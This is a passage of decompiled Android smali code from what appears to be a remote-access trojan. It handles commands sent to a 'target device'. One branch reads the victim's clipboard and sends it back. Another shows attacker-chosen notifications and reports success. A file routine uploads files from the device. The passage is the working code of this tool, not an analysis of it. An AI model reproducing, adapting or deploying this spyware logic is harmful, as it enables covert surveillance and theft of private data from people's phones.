    invoke-virtual {v12}, Ljava/util/ArrayList;->size()I

    move-result v10

    if-gtz v10, :cond_34

    const-string v10, "invisible_actions"

    invoke-virtual {v5, v10, v9}, Landroid/os/Bundle;->putBundle(Ljava/lang/String;Landroid/os/Bundle;)V

    invoke-virtual {v6, v10, v9}, Landroid/os/Bundle;->putBundle(Ljava/lang/String;Landroid/os/Bundle;)V

    invoke-virtual {v1, v4, v5}, Landroid/os/Bundle;->putBundle(Ljava/lang/String;Landroid/os/Bundle;)V

    invoke-virtual {v14, v4, v6}, Landroid/os/Bundle;->putBundle(Ljava/lang/String;Landroid/os/Bundle;)V

    move-object v4, v1

    const/4 v1, 0x0

    goto :goto_18

    :cond_34
    const/4 v1, 0x0

    invoke-static {v1}, Ljava/lang/Integer;->toString(I)Ljava/lang/String;

    invoke-virtual {v12, v1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v0

    invoke-static {v0}, La/a;->j(Ljava/lang/Object;)V

    sget-object v0, Lf2/s;->a:Ljava/lang/Object;

    .line 73
    new-instance v0, Landroid/os/Bundle;

    invoke-direct {v0}, Landroid/os/Bundle;-><init>()V

    const/4 v1, 0x0

    throw v1

    :cond_35
    const/4 v1, 0x0

    move-object v4, v1

    :goto_18
    sget v5, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 74
    invoke-static {v7, v4}, Lf2/l;->a(Landroid/app/Notification$Builder;Landroid/os/Bundle;)Landroid/app/Notification$Builder;

    invoke-static {v7, v1}, Lf2/p;->e(Landroid/app/Notification$Builder;[Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    const/16 v4, 0x1a

    if-lt v5, v4, :cond_36

    const/4 v4, 0x2

    invoke-static {v7, v4}, Lf2/q;->b(Landroid/app/Notification$Builder;I)Landroid/app/Notification$Builder;

    invoke-static {v7, v1}, Lf2/q;->e(Landroid/app/Notification$Builder;Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    invoke-static {v7, v1}, Lf2/q;->f(Landroid/app/Notification$Builder;Ljava/lang/String;)Landroid/app/Notification$Builder;

    const-wide/16 v9, 0x0

    invoke-static {v7, v9, v10}, Lf2/q;->g(Landroid/app/Notification$Builder;J)Landroid/app/Notification$Builder;

    const/4 v4, 0x0

    invoke-static {v7, v4}, Lf2/q;->d(Landroid/app/Notification$Builder;I)Landroid/app/Notification$Builder;

    invoke-static {v8}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v6

    if-nez v6, :cond_36

    invoke-virtual {v7, v1}, Landroid/app/Notification$Builder;->setSound(Landroid/net/Uri;)Landroid/app/Notification$Builder;

    move-result-object v6

    invoke-virtual {v6, v4}, Landroid/app/Notification$Builder;->setDefaults(I)Landroid/app/Notification$Builder;

    move-result-object v6

    invoke-virtual {v6, v4, v4, v4}, Landroid/app/Notification$Builder;->setLights(III)Landroid/app/Notification$Builder;

    move-result-object v6

    invoke-virtual {v6, v1}, Landroid/app/Notification$Builder;->setVibrate([J)Landroid/app/Notification$Builder;

    :cond_36
    if-lt v5, v0, :cond_37

    invoke-virtual {v11}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v1

    if-nez v1, :cond_38

    :cond_37
    const/4 v0, 0x0

    goto :goto_19

    :cond_38
    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    invoke-static {v0}, La/a;->j(Ljava/lang/Object;)V

    const/4 v0, 0x0

    throw v0

    :goto_19
    const/16 v1, 0x1d

    if-lt v5, v1, :cond_39

    const/4 v1, 0x1

    invoke-static {v7, v1}, Lf2/r;->a(Landroid/app/Notification$Builder;Z)Landroid/app/Notification$Builder;

    invoke-static {v7, v0}, Lf2/r;->b(Landroid/app/Notification$Builder;Landroid/app/Notification$BubbleMetadata;)Landroid/app/Notification$Builder;

    :cond_39
    const/16 v0, 0x1a

    .line 75
    invoke-static {v7}, Lf2/j;->a(Landroid/app/Notification$Builder;)Landroid/app/Notification;

    move-result-object v0

    const/4 v1, 0x0

    .line 76
    invoke-virtual {v3, v1, v0}, Landroid/app/NotificationManager;->notify(ILandroid/app/Notification;)V

    iget-object v0, v2, Lb/g;->b:Lc/b;

    iget-object v1, v2, Lb/g;->f:Ljava/lang/String;

    invoke-static {v1}, Lb/b;->h(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "Your notification has been displayed on the target device successfully\n"

    invoke-virtual {v2, v1}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lc/b;->a(Ljava/lang/String;)V

    goto/16 :goto_f

    .line 77
    :cond_3a
    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    invoke-static {v0}, La/a;->j(Ljava/lang/Object;)V

    const/4 v0, 0x0

    .line 78
    throw v0

    :sswitch_e
    const/4 v0, 0x0

    const-string v1, "clipboard"

    .line 79
    invoke-virtual {v3, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_3b

    goto/16 :goto_10

    :cond_3b
    move-object/from16 v1, p0

    iget-object v2, v1, Lb/d;->l:Lb/g;

    .line 80
    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 81
    new-instance v3, Lb/d;

    const/4 v4, 0x3

    invoke-direct {v3, v2, v4}, Lb/d;-><init>(Lb/g;I)V

    iget-object v2, v2, Lb/g;->d:Le/c;

    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 82
    iget-object v4, v2, Le/c;->a:Landroid/content/Context;

    const-string v5, "clipboard"

    invoke-virtual {v4, v5}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v4

    const-string v5, "null cannot be cast to non-null type android.content.ClipboardManager"

    invoke-static {v4, v5}, Ll4/h;->f0(Ljava/lang/Object;Ljava/lang/String;)V

    check-cast v4, Landroid/content/ClipboardManager;

    invoke-virtual {v4}, Landroid/content/ClipboardManager;->getPrimaryClip()Landroid/content/ClipData;

    move-result-object v4

    if-eqz v4, :cond_3c

    const/4 v5, 0x0

    invoke-virtual {v4, v5}, Landroid/content/ClipData;->getItemAt(I)Landroid/content/ClipData$Item;

    move-result-object v4

    if-eqz v4, :cond_3c

    invoke-virtual {v4}, Landroid/content/ClipData$Item;->getText()Ljava/lang/CharSequence;

    move-result-object v0

    :cond_3c
    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, "\nJoin us : "

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v0, v2, Le/c;->b:Ljava/lang/String;

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Lb/d;->N(Ljava/lang/Object;)Ljava/lang/Object;

    :goto_1a
    sget-object v0, Lh4/k;->a:Lh4/k;

    return-object v0

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_7
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch

    :sswitch_data_0
    .sparse-switch
        -0x5f64226a -> :sswitch_e
        -0x3a3e6224 -> :sswitch_d
        -0x36700cd3 -> :sswitch_c
        -0x21d29fad -> :sswitch_b
        -0xd72f940 -> :sswitch_a
        0x2dca72 -> :sswitch_9
        0x1db33bd -> :sswitch_8
        0x5a0d1d5 -> :sswitch_7
        0x6969627 -> :sswitch_6
        0x1a8b0f2a -> :sswitch_5
        0x1ae6756f -> :sswitch_4
        0x398b4351 -> :sswitch_3
        0x51b6992a -> :sswitch_2
        0x62f8f5b9 -> :sswitch_1
        0x7602e8b1 -> :sswitch_0
    .end sparse-switch
.end method

.method public final a(Ljava/io/File;)V
    .locals 4

    .line 1
    iget v0, p0, Lb/d;->k:I

    .line 2
    .line 3
    const-string v1, "The device has started uploading the file, please be patient\n"

    .line 4
    .line 5
    iget-object v2, p0, Lb/d;->l:Lb/g;

    .line 6
    .line 7
    const-string v3, "it"

    .line 8
    .line 9
    packed-switch v0, :pswitch_data_0

    .line 10
    .line 11
    .line 12
    :pswitch_0
    invoke-static {p1, v3}, Ll4/h;->i0(Ljava/lang/Object;Ljava/lang/String;)V

    .line 13
    .line 14
    .line 15
    iget-object v0, v2, Lb/g;->c:Lc/e;

    .line 16
    .line 17
    invoke-static {v0, p1}, Lc/e;->a(Lc/e;Ljava/io/File;)V

    .line 18
    .line 19
    .line 20
    return-void

    .line 21
    :pswitch_1
    invoke-static {p1, v3}, Ll4/h;->i0(Ljava/lang/Object;Ljava/lang/String;)V

    .line 22
    .line 23
    .line 24
    iget-object v0, v2, Lb/g;->b:Lc/b;

    .line 25
    .line 26
    iget-object v3, v2, Lb/g;->f:Ljava/lang/String;

    .line 27
    .line 28
    invoke-static {v3}, Lb/b;->h(Ljava/lang/String;)Ljava/lang/String;

    .line 29
    .line 30
    .line 31
    move-result-object v3

    .line 32
    invoke-virtual {v1, v3}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    .line 33
    .line 34
    .line 35
    move-result-object v1

    .line 36
    invoke-virtual {v0, v1}, Lc/b;->a(Ljava/lang/String;)V

    .line 37
    .line 38
    .line 39
    iget-object v0, v2, Lb/g;->c:Lc/e;

    .line 40
    .line 41
    invoke-static {v0, p1}, Lc/e;->a(Lc/e;Ljava/io/File;)V

    .line 42
    .line 43
    .line 44
    return-void

    .line 45
    :pswitch_2
    invoke-static {p1, v3}, Ll4/h;->i0(Ljava/lang/Object;Ljava/lang/String;)V

    .line 46
    .line 47
    .line 48
    iget-object v0, v2, Lb/g;->b:Lc/b;

    .line 49
    .line 50
    iget-object v3, v2, Lb/g;->f:Ljava/lang/String;

    .line 51
    .line 52
    invoke-static {v3}, Lb/b;->h(Ljava/lang/String;)Ljava/lang/String;

    .line 53
    .line 54
    .line 55
    move-result-object v3

    .line 56
    invoke-virtual {v1, v3}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    .line 57
    .line 58
    .line 59
    move-result-object v1

    .line 60
    invoke-virtual {v0, v1}, Lc/b;->a(Ljava/lang/String;)V

    .line 61
    .line 62
    .line 63
    iget-object v0, v2, Lb/g;->c:Lc/e;

    .line 64
    .line 65
    invoke-static {v0, p1}, Lc/e;->a(Lc/e;Ljava/io/File;)V

    .line 66
    .line 67
    .line 68
    return-void

    .line 69
    :pswitch_3
    invoke-static {p1, v3}, Ll4/h;->i0(Ljava/lang/Object;Ljava/lang/String;)V

    .line 70
    .line 71
    .line 72
    iget-object v0, v2, Lb/g;->c:Lc/e;

    .line 73
    .line 74
    invoke-static {v0, p1}, Lc/e;->a(Lc/e;Ljava/io/File;)V

    .line 75
    .line 76
    .line 77
    return-void

    .line 78
    :pswitch_4
    invoke-static {p1, v3}, Ll4/h;->i0(Ljava/lang/Object;Ljava/lang/String;)V

    .line 79
    .line 80
    .line 81
    iget-object v0, v2, Lb/g;->b:Lc/b;

    .line 82
    .line 83
    iget-object v3, v2, Lb/g;->f:Ljava/lang/String;

    .line 84
    .line 85
    invoke-static {v3}, Lb/b;->h(Ljava/lang/String;)Ljava/lang/String;

    .line 86
    .line 87
    .line 88
    move-result-object v3

    .line 89
    invoke-virtual {v1, v3}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    .line 90
    .line 91
    .line 92
    move-result-object v1

    .line 93
    invoke-virtual {v0, v1}, Lc/b;->a(Ljava/lang/String;)V

    .line 94
    .line 95
    .line 96
    iget-object v0, v2, Lb/g;->c:Lc/e;

    .line 97
    .line 98
    invoke-static {v0, p1}, Lc/e;->a(Lc/e;Ljava/io/File;)V

    .line 99
    .line 100
    .line 101
    return-void

    .line 102
    :pswitch_5
    invoke-static {p1, v3}, Ll4/h;->i0(Ljava/lang/Object;Ljava/lang/String;)V

    .line 103
    .line 104
    .line 105
    iget-object v0, v2, Lb/g;->b:Lc/b;

    .line 106
    .line 107
    iget-object v3, v2, Lb/g;->f:Ljava/lang/String;

    .line 108
    .line 109
    invoke-static {v3}, Lb/b;->h(Ljava/lang/String;)Ljava/lang/String;

    .line 110
    .line 111
    .line 112
    move-result-object v3

    .line 113
    invoke-virtual {v1, v3}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    .line 114
    .line 115
    .line 116
    move-result-object v1

    .line 117
    invoke-virtual {v0, v1}, Lc/b;->a(Ljava/lang/String;)V

    .line 118
    .line 119
    .line 120
    iget-object v0, v2, Lb/g;->c:Lc/e;

    .line 121
    .line 122
    invoke-static {v0, p1}, Lc/e;->a(Lc/e;Ljava/io/File;)V

    .line 123
    .line 124
    .line 125
    return-void

    .line 126
    :pswitch_6
    invoke-static {p1, v3}, Ll4/h;->i0(Ljava/lang/Object;Ljava/lang/String;)V

    .line 127
    .line 128
    .line 129
    iget-object v0, v2, Lb/g;->b:Lc/b;

    .line 130
    .line 131
    iget-object v3, v2, Lb/g;->f:Ljava/lang/String;

    .line 132
    .line 133
    invoke-static {v3}, Lb/b;->h(Ljava/lang/String;)Ljava/lang/String;

    .line 134
    .line 135
    .line 136
    move-result-object v3

    .line 137
    invoke-virtual {v1, v3}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    .line 138
    .line 139
    .line 140
    move-result-object v1

    .line 141
    invoke-virtual {v0, v1}, Lc/b;->a(Ljava/lang/String;)V

    .line 142
    .line 143
    .line 144
    iget-object v0, v2, Lb/g;->c:Lc/e;

    .line 145
    .line 146
    invoke-static {v0, p1}, Lc/e;->a(Lc/e;Ljava/io/File;)V

    .line 147
    .line 148
    .line 149
    return-void

    .line 150
    nop

    .line 151
    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_6
        :pswitch_5
        :pswitch_0
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
    .end packed-switch
.end method
